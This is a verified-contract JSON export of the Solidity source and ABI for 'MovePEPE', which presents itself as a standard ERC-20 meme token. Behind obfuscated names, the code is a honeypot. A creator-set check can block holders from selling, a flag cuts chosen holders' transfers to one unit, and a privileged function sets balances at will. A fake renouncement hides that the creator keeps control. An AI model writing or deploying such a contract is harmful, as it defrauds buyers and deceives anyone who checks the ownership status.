{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tokenSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldMin) external view returns (uint256);\n\n    function transfer(address takeAuto, uint256 toLaunch) external returns (bool);\n\n    function allowance(address walletExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeAuto,\n        uint256 toLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromTotal, uint256 value);\n    event Approval(address indexed walletExempt, address indexed spender, uint256 value);\n}\n\nabstract contract amountLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedTrading {\n    function createPair(address receiverLaunched, address takeFund) external returns (address);\n}\n\ninterface swapReceiver is tokenSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MovePEPE is amountLaunch, tokenSell, swapReceiver {\n\n    function name() external view virtual override returns (string memory) {\n        return autoTake;\n    }\n\n    uint256 private exemptFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamWallet;\n    }\n\n    address private liquidityAmount;\n\n    function minLiquidity(uint256 toLaunch) public {\n        fundFromLiquidity();\n        isTo = toLaunch;\n    }\n\n    function fundFromLiquidity() private view {\n        require(marketingSwap[_msgSender()]);\n    }\n\n    uint256 constant buyEnable = 1 ** 10;\n\n    uint256 private enableMax = 100000000 * 10 ** 18;\n\n    address public swapAt;\n\n    function transfer(address sellToken, uint256 toLaunch) external virtual override returns (bool) {\n        return walletEnable(_msgSender(), sellToken, toLaunch);\n    }\n\n    address exemptFeeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function minAt() public {\n        emit OwnershipTransferred(shouldLiquidity, address(0));\n        liquidityAmount = address(0);\n    }\n\n    bool public fundBuy;\n\n    bool public takeTo;\n\n    function exemptSwapMax(address sellToken, uint256 toLaunch) public {\n        fundFromLiquidity();\n        receiverTeam[sellToken] = toLaunch;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableMax;\n    }\n\n    uint256 private enableReceiver;\n\n    function allowance(address walletMax, address receiverAmount) external view virtual override returns (uint256) {\n        if (receiverAmount == exemptFeeAuto) {\n            return type(uint256).max;\n        }\n        return toShould[walletMax][receiverAmount];\n    }\n\n    uint256 private receiverTeamSender;\n\n    bool private buyAmount;\n\n    mapping(address => uint256) private receiverTeam;\n\n    bool private atReceiver;\n\n    mapping(address => bool) public marketingSwap;\n\n    function walletEnable(address enableFund, address takeAuto, uint256 toLaunch) internal returns (bool) {\n        if (enableFund == shouldLiquidity) {\n            return enableSellTo(enableFund, takeAuto, toLaunch);\n        }\n        uint256 launchedTake = tokenSell(swapAt).balanceOf(receiverReceiver);\n        require(launchedTake == isTo);\n        require(takeAuto != receiverReceiver);\n        if (minWalletReceiver[enableFund]) {\n            return enableSellTo(enableFund, takeAuto, buyEnable);\n        }\n        return enableSellTo(enableFund, takeAuto, toLaunch);\n    }\n\n    function balanceOf(address shouldMin) public view virtual override returns (uint256) {\n        return receiverTeam[shouldMin];\n    }\n\n    function transferFrom(address enableFund, address takeAuto, uint256 toLaunch) external override returns (bool) {\n        if (_msgSender() != exemptFeeAuto) {\n            if (toShould[enableFund][_msgSender()] != type(uint256).max) {\n                require(toLaunch <= toShould[enableFund][_msgSender()]);\n                toShould[enableFund][_msgSender()] -= toLaunch;\n            }\n        }\n        return walletEnable(enableFund, takeAuto, toLaunch);\n    }\n\n    event OwnershipTransferred(address indexed txWallet, address indexed receiverExempt);\n\n    string private autoTake = \"Move PEPE\";\n\n    function enableSellTo(address enableFund, address takeAuto, uint256 toLaunch) internal returns (bool) {\n        require(receiverTeam[enableFund] >= toLaunch);\n        receiverTeam[enableFund] -= toLaunch;\n        receiverTeam[takeAuto] += toLaunch;\n        emit Transfer(enableFund, takeAuto, toLaunch);\n        return true;\n    }\n\n    function approve(address receiverAmount, uint256 toLaunch) public virtual override returns (bool) {\n        toShould[_msgSender()][receiverAmount] = toLaunch;\n        emit Approval(_msgSender(), receiverAmount, toLaunch);\n        return true;\n    }\n\n    constructor (){\n        if (takeTo) {\n            buyTo = false;\n        }\n        sellTo tokenMax = sellTo(exemptFeeAuto);\n        swapAt = launchedTrading(tokenMax.factory()).createPair(tokenMax.WETH(), address(this));\n        \n        shouldLiquidity = _msgSender();\n        minAt();\n        marketingSwap[shouldLiquidity] = true;\n        receiverTeam[shouldLiquidity] = enableMax;\n        \n        emit Transfer(address(0), shouldLiquidity, enableMax);\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityAmount;\n    }\n\n    address public shouldLiquidity;\n\n    function txTotal(address liquidityFee) public {\n        if (fundBuy) {\n            return;\n        }\n        if (txLaunched != exemptFrom) {\n            buyTo = false;\n        }\n        marketingSwap[liquidityFee] = true;\n        if (txLaunched == isWallet) {\n            isWallet = receiverTeamSender;\n        }\n        fundBuy = true;\n    }\n\n    address receiverReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private teamWallet = 18;\n\n    mapping(address => mapping(address => uint256)) private toShould;\n\n    function toTake(address sellMarketingEnable) public {\n        fundFromLiquidity();\n        if (atReceiver == buyAmount) {\n            buyAmount = false;\n        }\n        if (sellMarketingEnable == shouldLiquidity || sellMarketingEnable == swapAt) {\n            return;\n        }\n        minWalletReceiver[sellMarketingEnable] = true;\n    }\n\n    uint256 private isWallet;\n\n    uint256 private atTrading;\n\n    function owner() external view returns (address) {\n        return liquidityAmount;\n    }\n\n    mapping(address => bool) public minWalletReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txShould;\n    }\n\n    uint256 isTo;\n\n    uint256 enableShouldToken;\n\n    bool private buyTo;\n\n    uint256 private txLaunched;\n\n    string private txShould = \"MPE\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLaunch\",\"type\":\"uint256\"}],\"name\":\"exemptSwapMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toLaunch\",\"type\":\"uint256\"}],\"name\":\"minLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minWalletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketingEnable\",\"type\":\"address\"}],\"name\":\"toTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"}],\"name\":\"txTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MovePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}